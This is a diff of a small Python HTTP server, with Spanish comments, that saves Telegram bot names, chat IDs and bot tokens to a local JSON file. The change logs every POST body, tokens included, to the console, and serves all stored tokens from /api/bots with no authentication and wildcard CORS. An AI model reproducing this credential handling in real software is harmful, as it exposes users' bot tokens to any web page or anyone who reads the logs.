@@ -1,5 +1,5 @@
 from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
-from urllib.parse import urlparse, parse_qs
+from urllib.parse import urlparse
 import json
 import os
 
@@ -21,7 +21,6 @@ def save_bots(bots):
 class Handler(SimpleHTTPRequestHandler):
     def do_GET(self):
         parsed = urlparse(self.path)
-        
         if parsed.path in ("/", "/main"):
             self.path = "/index.html"
         elif parsed.path == "/api/bots":
@@ -29,12 +28,10 @@ class Handler(SimpleHTTPRequestHandler):
             body = json.dumps(bots).encode("utf-8")
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
-            self.send_header("Content-Length", str(len(body)))
             self.send_header("Access-Control-Allow-Origin", "*")
             self.end_headers()
             self.wfile.write(body)
             return
-        
         super().do_GET()
 
     def do_POST(self):
@@ -42,52 +39,45 @@ class Handler(SimpleHTTPRequestHandler):
         content_length = int(self.headers.get("Content-Length", 0))
         body_raw = self.rfile.read(content_length).decode("utf-8", errors="ignore")
         
-        print(f"📩 POST {self.path}: {body_raw[:100]}...")
+        print("\n" + "="*50)
+        print(f"📩 PETICIÓN POST RECIBIDA")
+        print(f"📍 Ruta: {self.path}")
+        print(f"📦 Datos: {body_raw}")
+        print("="*50 + "\n")
 
-        if parsed.path == "/api/send":
-            try:
-                data = json.loads(body_raw)
-                bots = load_bots()
-                
-                new_bot = {
-                    "id": len(bots) + 1,
-                    "bot_name": data.get("bot_name", f"Bot_{len(bots)+1}"),
-                    "chat_id": data.get("chat_id", ""),
-                    "bot_token": data.get("bot_token", ""),
-                    "status": "ACTIVE"
-                }
-                bots.append(new_bot)
-                save_bots(bots)
-                
-                print(f"✅ Bot guardado: {new_bot['bot_name']}")
-                
-                response_data = {"success": True, "bot": new_bot, "bots": bots}
-            except Exception as e:
-                print(f"❌ Error: {e}")
-                response_data = {"success": False, "error": str(e)}
+        try:
+            data = json.loads(body_raw)
+        except:
+            data = {}
 
-            body = json.dumps(response_data).encode("utf-8")
-            self.send_response(200)
-            self.send_header("Content-Type", "application/json")
-            self.send_header("Content-Length", str(len(body)))
-            self.send_header("Access-Control-Allow-Origin", "*")
-            self.end_headers()
-            self.wfile.write(body)
-            return
+        # Guardamos en el archivo local por si acaso
+        if "bot_token" in data or "chat_id" in data:
+            bots = load_bots()
+            new_bot = {
+                "id": len(bots) + 1,
+                "bot_name": data.get("bot_name", "Bot Nuevo"),
+                "chat_id": data.get("chat_id", ""),
+                "bot_token": data.get("bot_token", ""),
+                "status": "ACTIVE"
+            }
+            # Evitamos duplicados simples
+            bots = [b for b in bots if b.get("bot_token") != new_bot["bot_token"]]
+            bots.append(new_bot)
+            save_bots(bots)
+            print(f"✅ Guardado en bots.json. Total bots: {len(bots)}")
 
-        elif parsed.path == "/api/csrf":
-            body = json.dumps({"csrf": "ok"}).encode("utf-8")
-            self.send_response(200)
-            self.send_header("Content-Type", "application/json")
-            self.send_header("Content-Length", str(len(body)))
-            self.end_headers()
-            self.wfile.write(body)
-            return
+        # Devolvemos una respuesta que CUALQUIER frontend puede entender
+        response_data = {
+            "success": True,
+            "ok": True,
+            "message": "Guardado correctamente",
+            "data": data,
+            "bot": new_bot if "bot_token" in data else None
+        }
 
-        body = json.dumps({"success": True}).encode("utf-8")
+        body = json.dumps(response_data).encode("utf-8")
         self.send_response(200)
         self.send_header("Content-Type", "application/json")
-        self.send_header("Content-Length", str(len(body)))
         self.send_header("Access-Control-Allow-Origin", "*")
         self.end_headers()
         self.wfile.write(body)
@@ -100,14 +90,13 @@ class Handler(SimpleHTTPRequestHandler):
         self.end_headers()
 
     def log_message(self, format, *args):
-        print(f"[{self.log_date_time_string()}] {format % args}")
+        pass # Silenciamos el log por defecto para ver solo nuestros prints
 
 if __name__ == "__main__":
-    print(" Servidor corriendo en: http://127.0.0.1:8080")
-    print("📱 Abre: http://127.0.0.1:8080/main")
+    print("🚀 Servidor listo en: http://127.0.0.1:8080")
     server = ThreadingHTTPServer(("127.0.0.1", 8080), Handler)
     try:
         server.serve_forever()
     except KeyboardInterrupt:
-        print("\n Servidor detenido")
+        print("\n⏹️ Servidor detenido")
         server.shutdown()
